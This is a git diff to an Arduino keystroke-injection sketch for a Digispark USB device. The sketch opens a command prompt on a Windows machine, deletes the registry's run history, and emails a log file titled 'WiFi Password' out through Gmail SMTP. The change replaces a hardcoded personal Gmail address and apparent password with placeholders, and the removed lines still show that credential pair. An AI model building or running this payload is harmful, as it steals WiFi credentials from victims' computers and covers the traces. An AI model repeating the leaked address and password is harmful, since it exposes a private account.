@@ -1,3 +1,6 @@
+//Replace "EMAIL" with your gmail
+//Replace "PASSWORD" with your gmail password
+
 #include <avr/pgmspace.h>
 #include "DigiKeyboard.h"
 const char line1[] PROGMEM = "cmd";
@@ -13,10 +16,10 @@ const char line10[] PROGMEM = "REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft
 const char line11[] PROGMEM = "$SMTPServer = 'smtp.gmail.com'";
 const char line12[] PROGMEM = "$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)";
 const char line13[] PROGMEM = "$SMTPInfo.EnableSsl = $true";
-const char line14[] PROGMEM = "$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('xxmikixx.dm@gmail.com', 'Mikolaj2006')";
+const char line14[] PROGMEM = "$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL', 'Password')";
 const char line15[] PROGMEM = "$ReportEmail = New-Object System.Net.Mail.MailMessage";
-const char line16[] PROGMEM = "$ReportEmail.From = 'xxmikixx.dm@gmail.com'";
-const char line17[] PROGMEM = "$ReportEmail.To.Add('xxmikixx.dm@gmail.com')";
+const char line16[] PROGMEM = "$ReportEmail.From = 'EMAIL'";
+const char line17[] PROGMEM = "$ReportEmail.To.Add('EMAIL')";
 const char line18[] PROGMEM = "$ReportEmail.Subject = 'WiFi Password'";
 const char line19[] PROGMEM = "$ReportEmail.Body = (Get-Content Log.txt | out-string)";
 const char line20[] PROGMEM = "$SMTPInfo.Send($ReportEmail)";
